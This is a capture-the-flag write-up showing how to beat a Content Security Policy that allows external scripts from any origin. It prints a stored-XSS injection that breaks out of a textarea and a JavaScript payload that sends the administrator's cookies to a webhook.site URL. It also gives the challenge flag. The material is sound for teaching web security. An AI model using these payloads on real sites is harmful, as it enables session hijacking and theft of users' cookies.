# Challenge `Read my lips: No more scripts!`

* **Flag:** `SSof{Inline_Scripts_are_not_allowed_with_this_CSP}`
* **Vulnerability:** Stored Cross-Site Scripting (XSS) via CSP bypass using external scripts
* **Where:** Blog post content field in the intermediate post-review page
* **Impact:** Allows execution of attacker-controlled JavaScript in the administrator’s browser even with a strict CSP blocking inline scripts

---

## Steps to reproduce

1. Attempt to reuse the inline `<script>` payload from the previous challenge (Task 3.2).

2. Observe that the browser blocks the payload and displays the following error in the console:

```text
Content-Security-Policy: The page’s settings blocked an inline script (script-src-elem) from being executed because it violates the following directive: “script-src *”. Consider using a hash (...) or a nonce.
```

3. Analyze the CSP directive:

```text
script-src *
```

This directive:

* Blocks inline scripts
* Could allow external scripts from any origin

4. To bypass this restriction, host a malicious JavaScript file using Webhook.site:

   * Open the Webhook editor
   * Use the Edit feature
   * Change the Conteent-Type to:

```text
application/javascript
```

5. Insert the following JavaScript payload into the Webhook editor (content field):

```javascript
var xhr = new XMLHttpRequest(); 
xhr.open( "GET", "https://webhook.site/0237655b-876d-49dc-b95f-9e890f48aa14?c=" + encodeURIComponent(document.cookie), true ); 
xhr.send();
```

6. In the content field of the intermediate blog post review page, inject the following external script loader payload:

```html
</textarea><script src="https://webhook.site/0237655b-876d-49dc-b95f-9e890f48aa14"></script>
```

7. Click “Update post and send it for admin review”.

9. Inspect the Webhook request logs and retrieve the leaked admin cookie, which contains the flag:

```
SSof{Inline_Scripts_are_not_allowed_with_this_CSP}
```